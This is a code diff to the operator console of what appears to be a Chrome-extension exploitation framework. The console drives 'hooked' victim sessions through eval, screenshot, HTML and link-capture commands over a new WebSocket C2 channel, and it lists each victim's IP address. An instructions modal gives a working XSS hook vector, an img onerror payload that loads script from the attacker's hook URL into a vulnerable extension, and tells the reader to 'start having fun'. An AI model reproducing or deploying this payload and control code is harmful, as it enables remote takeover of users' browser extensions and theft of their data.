@@ -1,6 +1,3 @@
-<?php 
-$hook_url = ($_SERVER['HTTPS'] ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . str_replace('/console.php', '/hook.php', $_SERVER['SCRIPT_NAME']);
-?>
 <html>
 <head>
 <script src="bootstrap/js/jquery.min.js"></script>
@@ -90,7 +87,7 @@ display:none;
                                             <li><a href="#tab-commands" data-toggle="tab">Commands</a></li>
                                             <li><a href="#tab-html" data-toggle="tab">HTML</a></li>
                                         </ul>
-                                        <div class="tab-content">
+                                        <div id=current-tab class="tab-content">
                                             <div class="tab-pane" id="tab-commands">
                                                 <form class="well" action="#">
                                                     <h4>Eval</h4>
@@ -103,7 +100,10 @@ display:none;
                                             </div>
                                             <div class="tab-pane" id="tab-html">
                                                 <p><button id=report-html type=button class="btn btn-primary">Get HTML</button></p>
-                                                <textarea id=tab-current-html style="width: 100%; height: 300px">
+                                                <textarea data-fld=html id=tab-current-html style="width: 100%; height: 300px">
+                                                </textarea>
+                                                <h4>Links</h4>
+                                                <textarea data-fld=links style="width: 100%; height: 300px">
                                                 </textarea>
                                             </div>
                                             <div class="tab-pane" id="tab-info">
@@ -243,9 +243,9 @@ display:none;
   </div>  
     <div class="modal-body">
       <p>First, you need to find a XSS vulnerable Chrome extension. I won't help here. Once you've found it, inject Chrome extension with a hook vector:
-      <pre>if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='<?php echo $hook_url ?>';d.body.appendChild(e);}</pre>
+      <pre class="hook-url">if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='__HOOK_URL__';d.body.appendChild(e);}</pre>
       <p>For example:
-      <pre>&lt;img src=x onerror="if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='<?php echo $hook_url ?>';d.body.appendChild(e);}"&gt;</pre>
+      <pre class="hook-url">&lt;img src=x onerror="if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='__HOOK_URL__';d.body.appendChild(e);}"&gt;</pre>
       <p>After hook has been executed, launch this console (in a separate browser), choose hooked session by clicking on the <i class="icon-list"></i> and start having fun!
   </div>
 </div>
@@ -256,6 +256,35 @@ display:none;
 </div>
 <script>
 
+var ws;
+
+if (document.location.pathname == '/') { // served through Node.js, use websockets
+    if (MozWebSocket) {
+        WebSocket = MozWebSocket;
+    }
+    ws = new WebSocket(document.location.href.replace(/^http/, 'ws'), 'chef');
+    if (!ws) {
+        alert("Trouble connecting through WebSocket, use PHP/Apache version or other browser");
+    } else {
+        ws.onmessage = function(ev) {
+            try {
+                var json = JSON.parse(ev.data);
+                for (var i=0; i < json.length; i++) {
+                    processResponse(json[i][0],hook);
+                }            
+            } catch (e) {}
+        }
+        ws.onopen = function() {
+            ws.send(JSON.stringify({cmd:'hello-c2c'}));
+        }
+        ws.onclose = function() {
+            alert("Connection to server dropped :(");
+        }
+    }
+} else { // served through Apache, use XHR php scripts
+    ws = false;
+}
+
 // current hook name
 var hook = '';
 var currentTab = null;
@@ -265,7 +294,11 @@ var sendCmd = function(cmd, param, additional) {
     if (additional) {
         to_send = $.extend(to_send, additional);
     }
-    $.post('server.php?ch=' + encodeURIComponent(hook) + '-cmd', JSON.stringify(to_send));
+    if (ws) {
+        ws.send(JSON.stringify({cmd:'command',p:to_send}));
+    } else {
+        $.post('server.php?ch=' + encodeURIComponent(hook) + '-cmd', JSON.stringify(to_send));
+    }
 };
 
 function log(m) {
@@ -384,7 +417,7 @@ function loadTabData(id) {
     }
     $("#tab-current-html").val(tab.html);
     fillDataTemplate($('#tab-info'), tab);
-    
+
 }
 
 function al(txt) {
@@ -430,9 +463,20 @@ function processResponse(r, hook) {
             al('Pong from ' + r.url);
             log('pong ' + r.url);
         break;
+        case 'server_msg':
+            al(r.result);
+        break;
     }
 }
 $(function() {
+
+    if (ws) {
+        var hook_url = document.location.href.replace(/\/$/, '/hook');
+    } else {    
+        var hook_url = document.location.href.replace('/console.html', '/hook.php');
+    }
+    
+    $('.hook-url').each(function() {$(this).text($(this).text().replace(/__HOOK_URL__/g, hook_url)) });
     
     $('#do-screenshot').click(function() {
         sendCmd('screenshot');
@@ -478,6 +522,9 @@ $(function() {
             $('#hook-id').text(v);
             al('Chosen hook: ' + v);
             $('#choose-hook-modal').modal('hide');
+            if (ws) {
+                ws.send(JSON.stringify({cmd:"set-channel",ch:v}));
+            }
             sendCmd('report');
 
         }
@@ -485,7 +532,7 @@ $(function() {
     });
     
     $('#choose-hook').click(function() {
-        $.getJSON('server.php', function(json) {
+        var displayHookChoice = function(json) {
             if (!json.length) {
                 al("No hooks present...");
                 return;
@@ -494,29 +541,40 @@ $(function() {
             $s.append($('<option>').text('choose...'));
             
             for (var i =0; i < json.length; i++) {
-                $('<option>').text(json[i]).val(json[i]).appendTo($s);
+                var text = json[i].ch + ' - ' + json[i].ip + ' ' + json[i].lastActive;
+                $('<option>').text(text).val(json[i].ch).appendTo($s);
             }
             $s.val(hook); // select current hook
             $('#choose-hook-modal').modal('show');
-
-        });
+        };
+        
+        if (ws) {
+            $.getJSON('/list', displayHookChoice);
+        } else {
+            $.getJSON('server.php', displayHookChoice);
+        }
+        
         return false;
     })
     
     $("#fix-server").click(function() {
+        if (ws) {
+            ws.send(JSON.stringify({cmd:'delete'}));
+        }
         $.get('server.php?delete=1');
     });
     
-    setInterval(function() {
-        if (hook) {
-            $.getJSON('server.php?ch=' + encodeURIComponent(hook), function(json) {
-                for (var i=0; i < json.length; i++) {
-                    processResponse(json[i][0],hook);
-                }
-            });
-        }
-    }, 2000);
-    
+    if (!ws) {
+        setInterval(function() {
+            if (hook) {
+                $.getJSON('server.php?ch=' + encodeURIComponent(hook), function(json) {
+                    for (var i=0; i < json.length; i++) {
+                        processResponse(json[i][0],hook);
+                    }
+                });
+            }
+        }, 2000);
+    }
     // start with saved data
     refreshTabsTable(hookStorage.getTabs(hook));
     al("Refreshed state from local storage");
